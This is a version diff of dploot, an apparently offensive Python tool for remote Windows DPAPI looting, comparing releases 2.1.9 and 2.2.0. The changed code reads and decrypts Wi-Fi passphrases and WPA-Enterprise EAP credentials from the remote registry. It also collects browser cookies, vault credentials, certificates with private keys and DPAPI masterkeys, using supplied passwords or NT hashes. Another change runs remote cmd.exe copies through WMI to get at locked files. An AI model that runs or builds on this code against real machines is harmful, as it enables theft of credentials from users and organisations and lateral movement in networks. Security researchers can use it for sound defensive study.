-                    data = self.smb_session._SMBConnection.read(treeId, fileId, offset, self.smb_session._SMBConnection._Connection['MaxReadSize'])
-                    written += len(data)
-                    offset  += len(data)
+                    bytesRead = self.smb_session._SMBConnection.read(treeId, fileId, offset, res['MaxReadSize'])
+                    written += len(bytesRead)
+                    offset  += len(bytesRead)
+                    data += bytesRead
         except Exception as e:
             if 'STATUS_OBJECT_PATH_NOT_FOUND' in str(e):
                 pass
             elif 'STATUS_OBJECT_NAME_NOT_FOUND' in str(e):
                 pass
             elif bypass_shared_violation and 'STATUS_SHARING_VIOLATION' in str(e):
                 wmiexec = DPLootWmiExec(target=self.target)
-                command = "cmd.exe /Q /c copy \"C:\\%s\" \"C:\\%s\"" % (path,wmiexec.output)
+                command = "cmd.exe /Q /c copy \"C:\\%s\" \"C:\\Windows\\Temp\\%s\"" % (path,wmiexec.output)
                 wmiexec.run(command)
                 time.sleep(1)
                 while True:
                     try:
-                        data = self.readFile(shareName=shareName, path=wmiexec.output)
+                        filepath = "Windows\\Temp\\" + wmiexec.output
+                        data = self.readFile(shareName=shareName, path=filepath)
                         break
                     except Exception as e:
                         if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                             # Output not finished, let's wait
                             time.sleep(1)
                             pass
                 self.smb_session.deleteFile(shareName, wmiexec.output)
```

### Comparing `dploot-2.1.9/dploot/lib/target.py` & `dploot-2.2.0/dploot/lib/target.py`

 * *Files 3% similar despite different names*

```diff
@@ -27,31 +27,31 @@
             domain = ""
 
         password = options.password
         if (
             not password
             and username != ""
             and options.hashes is None
-            and options.aes is None
+            and options.aesKey is None
             and options.no_pass is not True
-            and options.do_kerberos is not True
         ):
             from getpass import getpass
 
             password = getpass("Password:")
         hashes = options.hashes
         if hashes is not None:
             hashes = hashes.split(':')
             if len(hashes) == 1:
                 (nthash,) = hashes
                 lmhash = nthash
             else:
                 lmhash, nthash = hashes
         else:
-            lmhash = nthash = ''
+            nthash = ''
+            lmhash = ''
         
         if options.dc_ip is None:
             options.dc_ip = options.target
 
         self.domain = domain
         self.username = username
         self.password = password
@@ -59,14 +59,15 @@
         self.lmhash = lmhash
         self.nthash = nthash
         self.do_kerberos = options.k or options.aesKey is not None or options.use_kcache
         self.kdcHost = options.kdcHost
         self.use_kcache = options.use_kcache
         self.dc_ip = options.dc_ip
         self.aesKey = options.aesKey
+
         return self
 
     @staticmethod
     def create(domain: str = None,
         username: str = None,
         password: str = None,
         target: str = None,
@@ -176,18 +177,15 @@
     )
     group.add_argument(
         "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
     )
     group.add_argument(
         "-k",
         action="store_true",
-        help="Use Kerberos authentication. Grabs credentials from ccache file "
-        "(KRB5CCNAME) based on target parameters. If valid credentials "
-        "cannot be found, it will use the ones specified in the command "
-        "line",
+        help="Use Kerberos authentication"
     )
     group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
     group.add_argument("-use-kcache", action='store_true', help="Use Kerberos authentication from ccache file (KRB5CCNAME)")
     group.add_argument("-kdcHost", help="FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
     group.add_argument(
         "-dc-ip",
         action="store",
```

### Comparing `dploot-2.1.9/dploot/lib/utils.py` & `dploot-2.2.0/dploot/lib/utils.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/lib/wmi.py` & `dploot-2.2.0/dploot/lib/wmi.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/triage/backupkey.py` & `dploot-2.2.0/dploot/triage/backupkey.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/triage/browser.py` & `dploot-2.2.0/dploot/triage/browser.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,14 +1,13 @@
 import base64
 import json
 import logging
 import ntpath
 import tempfile
 import sqlite3
-import time
 from typing import List, Tuple
 from dploot.lib.crypto import decrypt_chrome_password
 
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import datetime_to_time
@@ -181,35 +180,16 @@
                                     path=path,
                                     cookie_name=name,
                                     cookie_value=cookie,
                                     creation_utc=creation_utc,
                                     expires_utc=expires_utc,
                                     last_access_utc=last_access_utc))
                         fh.close()
-                        break
         return credentials, cookies
 
-    # def readFile_through_wmi(self, shareName, filepath):
-    #     wmiexec = DPLootWmiExec(target=self.target)
-    #     command = "cmd.exe /Q /c copy \"C:\\%s\" \"C:\\%s\"" % (filepath,wmiexec.output)
-    #     # command = "cmd.exe /Q /c esentutl.exe /y \"C:\\%s\" /d \"C:\\%s\"" % (path,'bonjour')
-    #     wmiexec.run(command)
-    #     while True:
-    #         try:
-    #             data = self.conn.readFile(shareName=shareName, path=wmiexec.output)
-    #             break
-    #         except Exception as e:
-    #             if str(e).find('STATUS_SHARING_VIOLATION') >=0:
-    #                 # Output not finished, let's wait
-    #                 time.sleep(1)
-    #                 print("hey "+str(e))
-    #                 pass
-    #     self.conn.sb.deleteFile(shareName, wmiexec.output)
-    #     return data
-
     @property
     def users(self) -> List[str]:
         if self._users is not None:
             return self._users
         
         users = list()
```

### Comparing `dploot-2.1.9/dploot/triage/certificates.py` & `dploot-2.2.0/dploot/triage/certificates.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,30 +5,30 @@
 
 from impacket.dcerpc.v5 import rrp
 
 from Cryptodome.PublicKey import RSA
 from cryptography import x509
 from cryptography.hazmat._oid import ExtensionOID
 from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives.asymmetric.types import PRIVATE_KEY_TYPES
+from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
 from cryptography.hazmat.primitives.serialization import Encoding, NoEncryption, pkcs12, PublicFormat, load_der_private_key
 from pyasn1.codec.der import decoder
 from pyasn1.type.char import UTF8String
 
 from dploot.lib.crypto import CERTBLOB
 from dploot.lib.dpapi import decrypt_privatekey, find_masterkey_for_privatekey_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import is_certificate_guid
 from dploot.triage.masterkeys import Masterkey
 
 PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
 
 class Certificate:
-    def __init__(self, winuser: str, cert:x509.Certificate, pkey: PRIVATE_KEY_TYPES, pfx: bytes, username: str, filename: str, clientauth: bool):
+    def __init__(self, winuser: str, cert:x509.Certificate, pkey: PrivateKeyTypes, pfx: bytes, username: str, filename: str, clientauth: bool):
         self.winuser = winuser
         self.cert = cert
         self.pkey = pkey
         self.pfx = pfx
         self.username = username
         self.filename = filename
         self.clientauth = clientauth
@@ -91,52 +91,46 @@
         return certificates
 
     def loot_system_certificates(self) -> Dict[str,x509.Certificate]:
         my_certificates_key = 'SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates'
         ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
         regHandle = ans['phKey']
         certificate_keys = []
-        enumerated = False
-        index = 0
         certificates = {}
+        ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, my_certificates_key, samDesired=rrp.KEY_ENUMERATE_SUB_KEYS)
+        keyHandle = ans['phkResult']
         try:
-            ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, my_certificates_key)
-            keyHandle = ans['phkResult']
-            while not enumerated:
-                enum_ans = rrp.hBaseRegEnumKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, str(index))
-                if len(certificate_keys) > 0:
-                    if  enum_ans['lpNameOut'][:-1] in certificate_keys:
-                        enumerated = True
-                        continue
+            for index in range(100):
+                enum_ans = rrp.hBaseRegEnumKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, index)
                 certificate_keys.append(enum_ans['lpNameOut'][:-1])
-                index += 1
             rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
-            for certificate_key in certificate_keys:
-                try:
-                    regKey = my_certificates_key + '\\' + certificate_key
-                    ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
-                    keyHandle = ans['phkResult']
-                    _, certblob_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'Blob')
-                    certblob = CERTBLOB(certblob_bytes)
-                    if certblob.der is not None:
-                        cert = self.der_to_cert(certblob.der)
-                        certificates[certificate_key] = cert
-                    rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
-                except Exception as e:
-                    if logging.getLogger().level == logging.DEBUG:
-                        import traceback
-                        traceback.print_exc()
-                        logging.debug(str(e))
         except rrp.DCERPCSessionError as e:
-            if e.error_code == 2:
-                return 'ERROR_FILE_NOT_FOUND'
+            if e.error_code == 0x00000103:
+                pass
             elif logging.getLogger().level == logging.DEBUG:
                     import traceback
                     traceback.print_exc()
                     logging.debug(str(e))
+        for certificate_key in certificate_keys:
+            try:
+                regKey = my_certificates_key + '\\' + certificate_key
+                ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
+                keyHandle = ans['phkResult']
+                _, certblob_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'Blob')
+                logging.debug("Found Certificates Blob: \\\\%s\\%s" %  (self.target.address,regKey))
+                certblob = CERTBLOB(certblob_bytes)
+                if certblob.der is not None:
+                    cert = self.der_to_cert(certblob.der)
+                    certificates[certificate_key] = cert
+                rrp.hBaseRegCloseKey(self.conn.remote_ops._RemoteOperations__rrp, keyHandle)
+            except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
+                    logging.debug(str(e))
         return certificates
 
     def triage_certificates(self) -> List[Certificate]:
         certificates = []
         for user in self.users:
             try:
                 certificates += self.triage_certificates_for_user(user=user)
```

### Comparing `dploot-2.1.9/dploot/triage/credentials.py` & `dploot-2.2.0/dploot/triage/credentials.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/triage/masterkeys.py` & `dploot-2.2.0/dploot/triage/masterkeys.py`

 * *Files 4% similar despite different names*

```diff
@@ -125,20 +125,30 @@
                         guid = f.get_longname()
                         filepath = ntpath.join(user_masterkey_path_sid,guid)
                         logging.debug("Found MasterKey: \\\\%s\\%s\\%s" %  (self.target.address,self.share,filepath))
                         # read masterkey
                         masterkey_bytes = self.conn.readFile(self.share, filepath)
                         if masterkey_bytes is not None:
                             self.looted_files[guid] = masterkey_bytes
+                            password = None
+                            nthash = None
+                            if self.passwords is not None and user.lower() in self.passwords:
+                                password = self.passwords[user.lower()]
+                            elif self.passwords is not None and user.rpartition('.')[0].lower() in self.passwords:
+                                password = self.passwords[user.rpartition('.')[0].lower()] # In case of duplicate (like admin and admin.waza) on usernames in c:\Users\
+                            if self.nthashes is not None and user.lower() in self.nthashes:
+                                nthash = self.nthashes[user.lower()]
+                            elif self.nthashes is not None and user.rpartition('.')[0].lower() in self.nthashes:
+                                nthash = self.nthashes[user.rpartition('.')[0].lower()]
                             key = decrypt_masterkey(
                                 masterkey=masterkey_bytes,
                                 domain_backupkey=self.pvkbytes,
                                 sid=sid, 
-                                password=self.passwords[user.lower()] if self.passwords is not None and user.lower() in self.passwords else None,
-                                nthash=self.nthashes[user.lower()] if self.nthashes is not None and user.lower() in self.nthashes else None,
+                                password=password,
+                                nthash=nthash,
                                 )
                             if key is not None:
                                 masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user=user))
         return masterkeys
 
     def getDPAPI_SYSTEM(self,secretType, secret) -> None:
         if secret.startswith("dpapi_machinekey:"):
```

### Comparing `dploot-2.1.9/dploot/triage/rdg.py` & `dploot-2.2.0/dploot/triage/rdg.py`

 * *Files identical despite different names*

### Comparing `dploot-2.1.9/dploot/triage/vaults.py` & `dploot-2.2.0/dploot/triage/vaults.py`

 * *Files 3% similar despite different names*

```diff
@@ -10,16 +10,17 @@
 from dploot.lib.dpapi import decrypt_vcrd, decrypt_vpol, find_masterkey_for_vpol_blob
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.lib.utils import is_guid
 from dploot.triage.masterkeys import Masterkey
 
 class VaultCred:
-    def __init__(self, blob, type: "VAULT_INTERNET_EXPLORER|VAULT_WIN_BIO_KEY|VAULT_NGC_ACCOOUNT| Any", username: str = None, resource: str = None, password: str = None, sid: str = None, friendly_name: str = None, biometric_key: str = None, unlock_key: str = None, IV: str = None, cipher_text: str = None):
+    def __init__(self, winuser, blob, type: "VAULT_INTERNET_EXPLORER|VAULT_WIN_BIO_KEY|VAULT_NGC_ACCOOUNT| Any", username: str = None, resource: str = None, password: str = None, sid: str = None, friendly_name: str = None, biometric_key: str = None, unlock_key: str = None, IV: str = None, cipher_text: str = None):
         self.blob = blob
+        self.winuser = winuser
         if type is VAULT_INTERNET_EXPLORER:
             self.type = 'Internet Explorer'
             self.username = username
             self.resource = resource
             self.password = password
         elif type is VAULT_WIN_BIO_KEY:
             self.type = 'WINDOWS BIOMETRIC KEY'
@@ -73,15 +74,15 @@
         self.masterkeys = masterkeys
 
     def triage_system_vaults(self) -> List[VaultCred]:
         vaults_creds = list()
         vault_dirs = self.conn.listDirs(self.share, self.system_vault_generic_path)
         for system_vault_path,system_vault_dir in vault_dirs.items():
             if system_vault_dir is not None:
-                vaults_creds += self.triage_vaults_folder(vaults_folder_path=system_vault_path,vaults_folder=system_vault_dir)
+                vaults_creds += self.triage_vaults_folder(user = 'SYSTEM', vaults_folder_path=system_vault_path,vaults_folder=system_vault_dir)
         return vaults_creds
 
     def triage_vaults(self) -> List[VaultCred]:
         vaults_creds = list()
         for user in self.users:
             try:
                 vaults_creds += self.triage_vaults_for_user(user) 
@@ -94,18 +95,18 @@
         return vaults_creds
 
     def triage_vaults_for_user(self, user:str) -> List[VaultCred]:
         vaults_creds = list()
         vault_dirs = self.conn.listDirs(self.share, [elem % user for elem in self.user_vault_generic_path])
         for user_vault_path,user_vault_dir in vault_dirs.items():
             if user_vault_dir is not None:
-                vaults_creds += self.triage_vaults_folder(vaults_folder_path=user_vault_path,vaults_folder=user_vault_dir)
+                vaults_creds += self.triage_vaults_folder(user=user, vaults_folder_path=user_vault_path,vaults_folder=user_vault_dir)
         return vaults_creds
 
-    def triage_vaults_folder(self, vaults_folder_path, vaults_folder) -> List[VaultCred]:
+    def triage_vaults_folder(self, user, vaults_folder_path, vaults_folder) -> List[VaultCred]:
         vaults_creds = list()
         for d in vaults_folder:
             if is_guid(d.get_longname()) and d.is_directory()>0:
                 vault_dirname = d.get_longname()
                 vault_directory_path = ntpath.join(vaults_folder_path,vault_dirname)
                 logging.debug("Found Vault Directory: \\\\%s\\%s\\%s\n" %  (self.target.address,self.share,vault_directory_path))
                 
@@ -141,19 +142,19 @@
                         vrcd_filepath = ntpath.join(vault_directory_path,filename)
                         vrcd_bytes = self.conn.readFile(self.share, vrcd_filepath)
                         self.looted_files[vault_dirname + '_' + vrcd_filepath] = vpolblob_bytes  
                         if vrcd_bytes is not None and filename[-4:] in ['vsch','vcrd'] and len(vpol_keys) > 0:
                             vault = decrypt_vcrd(vrcd_bytes, vpol_keys)
                             if isinstance(vault, (VAULT_INTERNET_EXPLORER, VAULT_WIN_BIO_KEY, VAULT_NGC_ACCOOUNT)):
                                 if isinstance(vault, VAULT_INTERNET_EXPLORER):
-                                    vaults_creds.append(VaultCred(blob=vault, type=type(vault), username=vault['Username'].decode('utf-16le'),resource=vault['Resource'].decode('utf-16le'), password=vault['Password'].decode('utf-16le') ))
+                                    vaults_creds.append(VaultCred(winuser=user, blob=vault, type=type(vault), username=vault['Username'].decode('utf-16le'),resource=vault['Resource'].decode('utf-16le'), password=vault['Password'].decode('utf-16le') ))
                                 elif isinstance(vault, VAULT_WIN_BIO_KEY):
-                                    vaults_creds.append(VaultCred(blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1')))
+                                    vaults_creds.append(VaultCred(winuser=user, blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1')))
                                 elif isinstance(vault, VAULT_NGC_ACCOOUNT):
-                                    vaults_creds.append(VaultCred(blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1'), unlock_key=hexlify(vault["UnlockKey"]), IV=hexlify(vault["IV"]), cipher_text=hexlify(vault["CipherText"])))
+                                    vaults_creds.append(VaultCred(winuser=user, blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1'), unlock_key=hexlify(vault["UnlockKey"]), IV=hexlify(vault["IV"]), cipher_text=hexlify(vault["CipherText"])))
                             else:
                                 logging.debug('Vault decrypted but unknown data structure:')
         return vaults_creds
 
     @property
     def users(self) -> List[str]:
         if self._users is not None:
```

### Comparing `dploot-2.1.9/dploot/triage/wifi.py` & `dploot-2.2.0/dploot/triage/wifi.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,14 +1,15 @@
 from binascii import unhexlify
 import logging
 import ntpath
 from typing import Any, List
-from xml.dom import minidom
 from lxml import objectify
 
+from impacket.dcerpc.v5 import rrp
+
 from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
 
 from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target
 from dploot.triage.masterkeys import Masterkey
 
 EAP_TYPES = {
@@ -18,43 +19,47 @@
             23:"EAP AKA",
             25:"PEAP",
             50:"EAP AKA PRIME",
         }
 
 class WifiCred:
 
-    def __init__(self, ssid: str, auth: str, encryption: str, password: str = None, xml_data: Any = None) -> None:
+    def __init__(self, ssid: str, auth: str, encryption: str, password: str = None, xml_data: Any = None, eap_username: str = None, eap_password: str = None) -> None:
         self.ssid = ssid
         self.auth = auth
         self.encryption = encryption
         self.password = password
         self.xml_data = xml_data
 
         # EAP params
         self.onex = None
         self.eap_host_config = None
         self.eap_type = None
+        self.eap_username = eap_username
+        self.eap_password = eap_password
 
         if self.auth == 'WPA2' or self.auth == 'WPA':
             self.onex = getattr(self.xml_data.MSM.security, "{http://www.microsoft.com/networking/OneX/v1}OneX")
             self.eap_host_config = getattr(self.onex.EAPConfig, "{http://www.microsoft.com/provisioning/EapHostConfig}EapHostConfig")
             eap_type = int(getattr(self.eap_host_config.EapMethod, "{http://www.microsoft.com/provisioning/EapCommon}Type"))
             self.eap_type = EAP_TYPES[eap_type]
 
     def dump(self) -> None:
         print('[WIFI]')
         print('SSID:\t\t%s' % self.ssid)
-        if self.auth.upper() in ['WPAPSK', 'WPA2PSK']:
+        if self.auth.upper() in ['WPAPSK', 'WPA2PSK','WPA3SAE']:
             print('AuthType:\t%s' % self.auth.upper())
             print('Encryption:\t%s' % self.encryption.upper())
             print('Preshared key:\t%s' % self.password.decode('latin-1'))
         elif self.auth.upper() in ['WPA', 'WPA2']:
             print('AuthType:\t%s EAP' % self.auth.upper())
             print('Encryption:\t%s' % self.encryption.upper())
             print('EAP Type:\t%s' % self.eap_type)
+            if self.eap_username is not None and self.eap_password is not None:
+                print('Credentials:\t%s:%s' % (self.eap_username, self.eap_password))
             print()
             self.dump_all_xml(self.eap_host_config)
         elif self.auth.upper() == 'OPEN':
             print('AuthType:\t%s' % self.auth.upper())
             print('Encryption:\t%s' % self.encryption.upper())
         print()
 
@@ -70,25 +75,31 @@
             print("%s%s: %s" % ('  '*n, key, node.text))
 
 
 
     def dump_quiet(self) -> None:
         if self.auth.upper() == 'OPEN':
             print("[WIFI] %s - OPEN" % (self.ssid))
-        if self.auth.upper() in ['WPAPSK', 'WPA2PSK']:
+        elif self.auth.upper() in ['WPAPSK', 'WPA2PSK','WPA3SAE']:
             print("[WIFI] %s - %s - Passphrase: %s" % (self.ssid, self.auth.upper(), self.password))
-        else:
-            print("[WIFI] %s - WPA EAP - %s" % (self.ssid, self.eap_type))
+        elif self.auth.upper() in ['WPA', 'WPA2']:
+            if self.eap_username is not None and self.eap_password is not None:
+                print("[WIFI] %s - WPA EAP - %s - %s:%s" % (self.ssid, self.eap_type, self.eap_username, self.eap_password))
+            else:
+                print("[WIFI] %s - WPA EAP - %s" % (self.ssid, self.eap_type))
+        else: 
+            print("[WIFI] %s - %s - %s" % (self.auth.upper(), self.ssid))
 
 class WifiTriage:
 
     false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
 
     system_wifi_generic_path = "ProgramData\\Microsoft\\Wlansvc\\Profiles\\Interfaces"
     share = 'C$'
+    eap_profiles_key = "SOFTWARE\\Microsoft\\Wlansvc\\Profiles\\%s"
 
     def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
         self.target = target
         self.conn = conn
         
         self.looted_files = dict()
         self.masterkeys = masterkeys
@@ -102,80 +113,80 @@
                     if dir.is_directory() > 0 and dir.get_longname() not in self.false_positive:
                         wifi_interface_path = ntpath.join(self.system_wifi_generic_path,dir.get_longname())
                         wifi_interface_dir = self.conn.remote_list_dir(self.share, wifi_interface_path)
                         for file in wifi_interface_dir:
                             filename = file.get_longname()
                             if file.is_directory() == 0 and filename not in self.false_positive and filename[-4:] == '.xml':
                                 wifi_interface_filepath = ntpath.join(wifi_interface_path, filename)
-                                logging.info("Found Wifi connection file: \\\\%s\\%s\\%s" %  (self.target.address,self.share,wifi_interface_filepath))
+                                logging.debug("Found Wifi connection file: \\\\%s\\%s\\%s" %  (self.target.address,self.share,wifi_interface_filepath))
                                 wifi_interface_data = self.conn.readFile(self.share, wifi_interface_filepath)
                                 self.looted_files[filename] = wifi_interface_data
 
                                 main = objectify.fromstring(wifi_interface_data)
                                 
                                 ssid = main.SSIDConfig.SSID.name.text
                                 auth_type = main.MSM.security.authEncryption.authentication.text
                                 encryption = main.MSM.security.authEncryption.encryption.text
 
-                                if auth_type == 'WPA2PSK' or auth_type == 'WPAPSK':
+                                if auth_type in ['WPA2PSK','WPAPSK','WPA3SAE']:
                                     
                                     dpapi_blob = main.MSM.security.sharedKey.keyMaterial
                                     masterkey = find_masterkey_for_blob(unhexlify(dpapi_blob.text), masterkeys=self.masterkeys)
                                     password = ''
                                     if masterkey is not None:
                                         password = decrypt_blob(unhexlify(dpapi_blob.text), masterkey=masterkey)
                                     wifi_creds.append(WifiCred(
                                         ssid=ssid,
                                         auth=auth_type,
                                         encryption=encryption,
                                         password=password,
                                         xml_data=main))
+                                elif auth_type in ['WPA', 'WPA2']:
+                                    creds = self.triage_eap_creds(filename[:-4])
+                                    eap_username = None
+                                    eap_password = None
+                                    if creds is not None:
+                                        eap_username = creds[0].decode('latin-1')
+                                        eap_password = creds[1].decode('latin-1')
+                                    wifi_creds.append(WifiCred(
+                                        ssid=ssid,
+                                        auth=auth_type,
+                                        encryption=encryption,
+                                        xml_data=main,
+                                        eap_username=eap_username,
+                                        eap_password=eap_password))    
                                 else:
                                     wifi_creds.append(WifiCred(
                                         ssid=ssid,
                                         auth=auth_type,
                                         encryption=encryption,
-                                        xml_data=main))
-                                    # onex = getattr(main.MSM.security, "{http://www.microsoft.com/networking/OneX/v1}OneX")
-                                    # print(objectify.dump(onex.EAPConfig))
-                                    # eap_host_config = getattr(onex.EAPConfig, "{http://www.microsoft.com/provisioning/EapHostConfig}EapHostConfig")
-                                    # eap_type = getattr(eap_host_config.EapMethod, "{http://www.microsoft.com/provisioning/EapCommon}Type")
-                                    # print(eap_type)
-                                    # # onex = getattr(onex.EAPConfig, "{http://www.microsoft.com/networking/OneX/v1}EAPConfig")
-                                    # # print(objectify.dump(onex))
-                                    
-                                    # import sys
-                                    # sys.exit(1)
-
-                                # xml_data = minidom.parseString(wifi_interface_data)
-                                # ssid = xml_data.getElementsByTagName('SSID')[0].getElementsByTagName('name')[0].childNodes[0].data
-                                # auth_type = xml_data.getElementsByTagName('authentication')[0].childNodes[0].data
-                                # encryption = xml_data.getElementsByTagName('encryption')[0].childNodes[0].data
-                                # if auth_type == 'WPA2PSK' or auth_type == 'WPAPSK': # WPA Personnal
-                                #     dpapi_blob = xml_data.getElementsByTagName('keyMaterial')[0].childNodes[0].data
-                                #     masterkey = find_masterkey_for_blob(unhexlify(dpapi_blob), masterkeys=self.masterkeys)
-                                #     password = ''
-                                #     if masterkey is not None:
-                                #         password = decrypt_blob(unhexlify(dpapi_blob), masterkey=masterkey)
-                                #     wifi_creds.append(WifiCred(ssid, auth_type, encryption=encryption,password=password))
-                                # elif auth_type == 'WPA2' or auth_type == 'WPA': # WPA Entreprise
-                                #     print('waza')
-                                #     print(wifi_interface_data.decode('utf-8'))
-
-                                #     eap_type = xml_data.getElementsByTagName('Type')[0].childNodes[0].data
-                                #     eap_config = xml_data.getElementsByTagName('EAPConfig')
-                                #     print(eap_config)
-                                #     # eap_type = xml_data.getElementsByTagName('authMode')[0].childNodes[0].data
-
-                                #     # https://learn.microsoft.com/en-us/windows/win32/nativewifi/wpa2-enterprise-with-peap-mschapv2-profile-sample
-                                #     wifi_creds.append(WifiCred(ssid, auth_type, encryption=encryption,eap_type=eap_type))
-                                # elif auth_type == 'open': # OPEN
-                                #     wifi_creds.append(WifiCred(ssid, auth_type, encryption=encryption))
-                                # else:
-                                #     logging.debug('Unsupported authentication type: %s. Please open issue to improve the project!' % auth_type)
+                                        xml_data=main))               
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
                 logging.debug(str(e))
             pass
-        return wifi_creds
+        return wifi_creds
+    
+    def triage_eap_creds(self, eap_profile):
+        try:
+            self.conn.enable_remoteops()
+            regKey = self.eap_profiles_key % eap_profile
+            ans = rrp.hOpenLocalMachine(self.conn.remote_ops._RemoteOperations__rrp)
+            regHandle = ans['phKey']
+            ans = rrp.hBaseRegOpenKey(self.conn.remote_ops._RemoteOperations__rrp, regHandle, regKey)
+            keyHandle = ans['phkResult']
+            _, msm_bytes = rrp.hBaseRegQueryValue(self.conn.remote_ops._RemoteOperations__rrp, keyHandle, 'MSMUserData')
+            masterkey = find_masterkey_for_blob(msm_bytes, masterkeys=self.masterkeys)
+            if masterkey is not None:
+                blob = decrypt_blob(blob_bytes=msm_bytes,masterkey=masterkey)
+                username = blob[176:].split(b'\0')[0]
+                password = blob[432:].split(b'\0')[1]
+                return (username, password)
+        except Exception as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+                logging.debug(str(e))
+            return None
+        return None
```

